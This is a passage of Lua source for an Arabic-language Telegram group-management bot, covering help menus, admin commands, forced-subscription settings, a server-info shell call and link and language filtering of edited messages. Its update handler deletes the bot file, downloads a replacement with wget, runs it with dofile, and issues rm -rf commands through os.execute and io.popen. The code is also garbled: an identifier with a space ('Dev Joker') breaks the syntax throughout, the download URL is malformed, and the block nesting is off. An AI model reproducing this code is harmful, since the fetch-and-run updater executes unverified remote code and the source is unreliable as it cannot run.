if text and text:match("^م3$") or text and text:match("^م٣$") or text and text:match("^اوامر3$") or text and text:match("^اوامر٣$") then
local help = DevAbs:get(Dev Joker..'bot:help3')
local text =  [[
⌁︙اوامر المدراء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙فحص البوت
⌁︙ضع اسم + الاسم
⌁︙اضف • حذف ↫ رد
⌁︙ردود المدير
⌁︙حذف ردود المدير
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙رفع ادمن • تنزيل ادمن
⌁︙الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تثبيت
⌁︙الغاء التثبيت
⌁︙اعاده التثبيت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغير رد + اسم الرتبه + النص ↫ ⤈
⌁︙المطور • المنشئ الاساسي
⌁︙المنشئ • المدير • الادمن
⌁︙المميز • العضو
⌁︙حذف ردود الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تغيير الايدي ↫ لتغيير الكليشه
⌁︙تعيين الايدي ↫ لتعيين الكليشه
⌁︙حذف الايدي ↫ لحذف الكليشه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ اطردني
⌁︙تفعيل • تعطيل ↫ الايدي
⌁︙تفعيل • تعطيل ↫ ضافني
⌁︙تفعيل • تعطيل ↫ الابراج
⌁︙تفعيل • تعطيل ↫ الزخرفه
⌁︙تفعيل • تعطيل ↫ حساب العمر
⌁︙تفعيل • تعطيل ↫ ردود المطور
⌁︙تفعيل • تعطيل ↫ تنبيه التغيرات
⌁︙تفعيل • تعطيل ↫ الايدي بالصوره
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م4$") and is_leader(msg) or text and text:match("^تعيين امر م٤$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م4) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help41'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده" ,  1, "md")
DevAbs:set(Dev Joker..'bot:help41'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help4', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٤$") or text and text:match("^م4$") or text and text:match("^اوامر4$") or text and text:match("^اوامر٤$") then
local help = DevAbs:get(Dev Joker..'bot:help4')
local text =  [[
⌁︙اوامر المنشئين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تنزيل الكل
⌁︙اضف • حذف ↫ امر
⌁︙حذف الاوامر المضافه
⌁︙الاوامر المضافه
⌁︙اضف نقاط + الايدي
⌁︙اضف رسائل + الايدي
⌁︙رفع مدير • تنزيل مدير
⌁︙المدراء • حذف المدراء
⌁︙تفعيل • تعطيل ↫ الحظر
⌁︙تفعيل • تعطيل ↫ الكتم
⌁︙تفعيل • تعطيل ↫ نزلني
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ الرفع
⌁︙رفع منشئ • تنزيل منشئ
⌁︙المنشئين • حذف المنشئين
⌁︙رفع • تنزيل ↫ ادمن بالكروب
⌁︙رفع بكل الصلاحيات
⌁︙حذف القوائم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر منشئ المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ منشئ اساسي
⌁︙حذف المنشئين الاساسيين 
⌁︙المنشئين الاساسيين 
⌁︙حذف جميع الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م5$") and is_leader(msg) or text and text:match("^تعيين امر م٥$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م5) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help51'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help51'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help5', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٥$") or text and text:match("^م5$") or text and text:match("^اوامر5$") or text and text:match("^اوامر٥$") then
if not is_SudoBot(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمطورين فقط ', 1, 'md')
else
local help = DevAbs:get(Dev Joker..'bot:help5')
local text =  [[
⌁︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙المجموعات
⌁︙المطورين
⌁︙المشتركين
⌁︙الاحصائيات
⌁︙المجموعات
⌁︙اسم البوت + غادر
⌁︙اسم البوت + تعطيل
⌁︙كشف + -ايدي المجموعه
⌁︙فلتر عام + الكلمه ↫ للمنع
⌁︙الغاء فلتر عام + الكلمه
⌁︙حذف • قائمه المنع العام
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙رفع • تنزيل ↫ مدير عام
⌁︙حذف • المدراء العامين 
⌁︙رفع • تنزيل ↫ ادمن عام
⌁︙حذف • الادمنيه العامين 
⌁︙رفع • تنزيل ↫ مميز عام
⌁︙حذف • المميزين عام 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙اوامر المطور الاساسي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تحديث
⌁︙السيرفر 
⌁︙روابط المجموعات
⌁︙تحديث السورس
⌁︙تنظيف الرسائل 
⌁︙تنظيف المجموعات
⌁︙تنظيف المشتركين
⌁︙ضع • حذف ↫ دعم
⌁︙تعيين الايدي العام
⌁︙غادر + -ايدي المجموعه
⌁︙حظر عام • الغاء العام
⌁︙كتم عام • الغاء العام
⌁︙قائمه العام • حذف قائمه العام
⌁︙وضع • حذف ↫ اسم البوت
⌁︙اضف • حذف ↫ رد عام
⌁︙ردود المطور • حذف ردود المطور
⌁︙تعيين • حذف • جلب ↫ رد الخاص
⌁︙جلب نسخه المجموعات
⌁︙رفع النسخه + بالرد على الملف
⌁︙تعيين • حذف ↫ قناة الاشتراك
⌁︙جلب كليشه الاشتراك
⌁︙تغيير • حذف ↫ كليشه الاشتراك
⌁︙رفع • تنزيل ↫ مطور
⌁︙المطورين • حذف المطورين
⌁︙تعيين • حذف ↫ كليشة الايدي
⌁︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙تفعيل • تعطيل ↫ التنبيه
⌁︙تفعيل • تعطيل ↫ التواصل
⌁︙تفعيل • تعطيل ↫ المغادره
⌁︙تفعيل • تعطيل ↫ رد الخاص
⌁︙تفعيل • تعطيل ↫ المجموعات
⌁︙تفعيل • تعطيل ↫ البوت الخدمي
⌁︙تفعيل • تعطيل ↫ الاشتراك الاجباري
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end end
if text and text:match("^تعيين امر م6$") and is_leader(msg) or text and text:match("^تعيين امر م٦$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة (م6) الان " ,  1, "md")
DevAbs:set(Dev Joker..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(Dev Joker..'bot:help61'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حفظ الكليشة الجديده" ,  1, "md")
DevAbs:set(Dev Joker..'bot:help61'..msg.sender_user_id_..'', 'no')
DevAbs:set(Dev Joker..'bot:help6', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
end
if text and text:match("^م٦$") or text and text:match("^م6$") or text and text:match("^اوامر6$") or text and text:match("^اوامر٦$") then
local help = DevAbs:get(Dev Joker..'bot:help6')
local text =  [[
⌁︙اوامر الاعضاء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙السورس • موقعي • رتبتي • معلوماتي
⌁︙رسائلي • رسائلي اليوم • حذف رسائلي
⌁︙اسمي • معرفي • ايدي • ايديي • جهاتي
⌁︙الالعاب • نقاطي • بيع نقاطي • المطور
⌁︙القوانين • رابط الحذف • زخرفه • المطايه
⌁︙منو ضافني • نزلني • اطردني • الرابط
⌁︙مشاهدات المنشور • ايدي المجموعه
⌁︙اسم المجموعه • معلومات المجموعه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙كول + الكلمه
⌁︙زخرفه + اسمك
⌁︙برج + نوع البرج
⌁︙احسب + تاريخ ميلادك
⌁︙رفع مطي • تنزيل مطي
⌁︙بوسه • بوسها ↫ بالرد
⌁︙هينه • هينها ↫ بالرد بالمعرف
⌁︙صيحه • صيحها ↫ بالرد • بالمعرف
⌁︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
⌁︙[Source Channel](https://t.me/So_Victor)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
--     Source Joker     --
if is_leader(msg) then
if text == "تحديث السورس" or text == "تحديث سورس" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙جاري تحديث سورس فكتور', 1, 'md') 
os.execute('rm -rf Dev Joker.lua') 
os.execute('wget https://github.com/abbodkil1/CArlos.git/master/Dev Joker.lua') 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم التحديث الى الاصدار الجديد', 1, 'md') 
dofile('Dev Joker.lua') 
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث ⌁' then  
dofile('Dev Joker.lua')  
io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم تحديث ملفات البوت", 1, "md")
end 
end 
--     Source Joker     --
if text and text:match("^اضف رسائل (%d+)$") and ChCheck(msg) then  
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
TXT = text:match("^اضف رسائل (%d+)$")
DevAbs:set('ABS_PROX:'..bot_id..'id:user'..msg.chat_id_,TXT)  
DevAbs:setex('ABS_PROX:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد الرسائل الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
if text and text:match("^اضف نقاط (%d+)$") and ChCheck(msg) then  
if is_monshid(msg.sender_user_id_, msg.chat_id_) then
TXT = text:match("^اضف نقاط (%d+)$")
DevAbs:set('ABS_PROX:'..bot_id..'ids:user'..msg.chat_id_,TXT)  
DevAbs:setex('ABS_PROX:'..bot_id.."nmadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 300, true)  
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل عدد النقاط الان \n⌁︙ارسل الغاء لالغاء الامر ", 1, "md")
Dev_Abs(msg.chat_id_, msg.id_, 1,numd, 1, 'md') 
else 
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙هذا الامر للمنشئين فقط', 1, 'md') 
end 
end 
--     Source Joker     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙ارسل كليشة المطور الان ", 1, "md")
DevAbs:setex(Dev Joker.."bot:DevText" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم حذف كليشة المطور", 1, "md")
DevAbs:del(Dev Joker.."DevText")
end end
--     Source Joker     --
if DevAbs:get(Dev Joker.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء الامر", 1, "md") 
DevAbs:del(Dev Joker.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
return false  end 
DevAbs:del(Dev Joker.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAbs:set(Dev Joker..'bot:textch:user',texxt)
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغيير كليشه الاشتراك الاجباري$") and is_leader(msg) or text and text:match("^تغيير كليشه الاشتراك$") and is_leader(msg) then  
DevAbs:setex(Dev Joker.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
local text = '⌁︙حسنا ارسل كليشة الاشتراك الجديدة'  
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(Dev Joker..'bot:textch:user')
textt = "⌁︙تم حذف كليشة الاشتراك الاجباري"
Dev_Abs(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevAbs:get(Dev Joker.."bot:textch:user")
if chtext then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙كليشة الاشتراك ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
else
local DevAbs6 = DevAbs:get(Dev Joker.."DevAbs3")
if DevAbs6 then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙عليك الاشتراك في قناة البوت \n⌁︙قناة البوت ↫ '..DevAbs6, 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙لم يتم تعيين قناة الاشتراك الاجباري \n⌁︙ارسل (تعيين قناة الاشتراك) للتعيين ', 1, 'md')
end end end end
--     Source Joker     --
if text and text:match("^القناة$") or text and text:match("^قناة السورس$") or text and text:match("^قنات السورس$") then
Dev_Abs(msg.chat_id_, msg.id_, 1, '⌁︙Channel ↬ @So_Victor', 1, 'html')    
end 
--     Source Joker     --
if is_leader(msg) then 
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⌁︙نظام التشغيل ↫ ⤈\n`'"$linux_version"'`' 
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الذاكره العشوائيه ↫ ⤈\n`'"$memUsedPrc"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙وحدة التخزين ↫ ⤈\n`'"$HardDisk"'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙المعالج ↫ ⤈\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الدخول ↫ ⤈\n`'`whoami`'`'
echo '┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙مدة تشغيل السيرفر ↫ ⤈\n`'"$uptime"'`'
]]):read('*a'), 1, 'md')
end
end
--     Source Joker     --
--        end code        --
--     Source Joker     --
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
DevAbs:incr(Dev Joker..'bot:editmsg'..result.chat_id_..result.sender_user_id_)
local text = result.content_.text_ or result.content_.caption_
local Text = result.content_.text_
if result.id_ and result.content_.text_ then
DevAbs:set(Dev Joker..'bot:editid'..result.id_,result.content_.text_)
end 
if DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) and not Text and not is_monsh(result.sender_user_id_, result.chat_id_) then
delete_msg(msg.chat_id_,{[0] = data.message_id_})
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,dp) 
local absname = '⌁︙العضو ↫ ['..CatchName(dp.first_name_,15)..'](tg://user?id='..dp.id_..')'
local absid = '⌁︙ايديه ↫ `'..dp.id_..'`'
local abstext = '⌁︙قام بالتعديل على الميديا'
local function cb(extra,result,success)
local admins = result.members_  
text = '\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for i=0 , #admins do 
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,data) 
text = text.."⌯ [@"..data.username_.."]\n"
if #admins == i then 
sendText(msg.chat_id_, absname..'\n'..absid..'\n'..abstext..text,0,'md') 
end
end,nil)
end
end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200,cb)
end,nil)
end
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if DevAbs:get(Dev Joker..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
--     Source Joker     --
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") or text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Dd][Oo][Gg]") then
if DevAbs:get(Dev Joker..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match("[Ww][Ww][Ww].") or text:match(".[Xx][Yy][Zz]") then
if DevAbs:get(Dev Joker..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if DevAbs:get(Dev Joker..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then 
if DevAbs:get(Dev Joker..'bot:abstag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if DevAbs:get(Dev Joker..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if DevAbs:get(Dev Joker..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     Source Joker     --
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then
tdcli_function ({ID="GetChats", offset_order_="9223372036854775807", offset_chat_id_=0, limit_=20}, dl_cb, nil)
end
--     Source Joker     --
end 
------------------------------------------------
-- This Source Was Developed By (ABS) @IQ_ABS.--
--   This Is The Source Channel @BLACK_TEAM_4 .   --
--                - Dev Joker -                 --
--        -- https://t.me/BLACK_TEAM_4 --         --
------------------------------------------------ 

